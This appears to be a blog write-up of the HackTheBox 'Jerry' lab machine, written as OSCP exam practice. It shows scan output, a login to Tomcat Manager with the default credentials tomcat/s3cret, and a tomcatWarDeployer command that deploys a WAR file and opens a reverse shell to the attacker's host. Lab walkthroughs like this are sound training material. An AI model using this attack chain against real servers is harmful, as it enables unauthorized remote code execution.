---
layout: post
title: HackTheBox Jerry Writeup - OSCP Practice 
categories: [security, hackthebox, oscp-writeups, thursday-snack]
tags: [security, hackthebox, oscp]
description: A comprehensive writeup on HackTheBox Jerry VM which helps learn and practice for OSCP.
comments: true
---


### Quick Overview

[Jerry](https://app.hackthebox.com/machines/144) is one of the Windows Box from [TJNull OSCP Practice list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#). It's one of those quite easy machine where you get initial foothold & privilege escalation in a single hop.

![Jerry VM - HacktheBox Logo](/assets/media/htb-jerry-logo.jpg)

### Enumeration

#### NMapAutomator

Started with enumerating the target with [`NMapAutomator`](https://github.com/21y4d/nmapAutomator) script since it helps in automating all possible ports with vulnerability scripts from `nmap`. Additionally, `NmapAutomator` can help in recon process using `ffuf`, `nikto`, `DNSRecon`, `SMB` enumeration.

> `sudo nmapAutomator.sh -H $IP --type All`

```bash
Running all scans on jerry.htb with IP 3(NXDOMAIN)
No ping detected.. Will not use ping scans!
Host is likely running Unknown OS!
---------------------Starting Port Scan-----------------------
PORT     STATE SERVICE
8080/tcp open  http-proxy
---------------------Starting Script Scan-----------------------
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1

---------------------Starting Full Scan------------------------
PORT     STATE SERVICE
8080/tcp open  http-proxy
No new ports
```

#### Nikto Scan 

```
---------------------Running Recon Commands--------------------
Starting nikto scan                                                                                                    
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.136.9
+ Target Hostname:    jerry.htb
+ Target Port:        8080
+ Start Time:         2023-02-26 17:43:42 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7890 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2023-02-26 17:46:58 (GMT-5) (196 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
Finished nikto scan
```

#### Suspect 1

If you're familiar with Apache Tomcat and Java (JSP) based development, You'll certainly create a reverse shell out of this `Tomcat Manager` exposed in port `8080` with zero assistance from tooling. After checking the Nikto results, looks like `Tomcat Manager` has been exposed and it has few passwords in `<TOMCAT_HOME>/conf/tomcat-users.xml`. While trying to perform login, the error page actually exposes the password.

![Hackthebox - Jerry VM - Tomcat Manager Password exposure](/assets/media/htb-jerry-enumeration-2.png)

After consuming the password of `tomcat` user as `s3cret`, We're now able to manage, upload, destroy `JSP` based application via Tomcat Manager. This clearly shows a way to perform `Code execution` via uploading JSP War File. 

![Hackthebox - Jerry VM - Tomcat Manager](/assets/media/htb-jerry-tomcat-manager.png)

### Local Shell

Upon scrolling down in the same `Tomcat Manager` page, you may find an option to upload and deploy `war` file. This is where [`TomcatWarDeployer`](https://github.com/mgeeky/tomcatWarDeployer) comes useful. The only caveat was latest python 3.10 wasn't working with the script. I had to do bunch of changes as like `decode('utf-8')` & `encode()` between `str` and `byte` datastructure. This TomcatWarDeployer authenticate with `tomcat` user credentials and upload `jsp_app` and spawns a `reverse shell` in the same terminal.

`> python tomcatWarDeployer.py -U tomcat -P s3cret -H LHOST -p 443 jerry.htb:8080`

![Hackthebox - Jerry VM - Local Shell](/assets/media/htb-jerry-local-shell.png)

### Privilege Escalation

If you take a closer look at the `whoami` result `nt authority\system` which is already system admin level permission in Windows. You can grab your flags from Administrator\Desktop\flags directory. You can actually find couple of flags in `2 for the price of 1.txt` file.

```powershell
C:\apache-tomcat-7.0.88> cd flags                                                                                     

C:\Users\Administrator\Desktop\flags>

C:\apache-tomcat-7.0.88> dir                                                                                          
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,015,680 bytes free
```

![HackTheBox - Shivasurya.me](/assets/media/htb-sherlock.webp)

### Closing Note:

I hope this post is helpful for folks preparing for Offensive Security Certified Professional certification exam. For bugs,hugs & discussion, DM in [Twitter](https://twitter.com/sshivasurya). Opinions are my own and not the views of my employer.
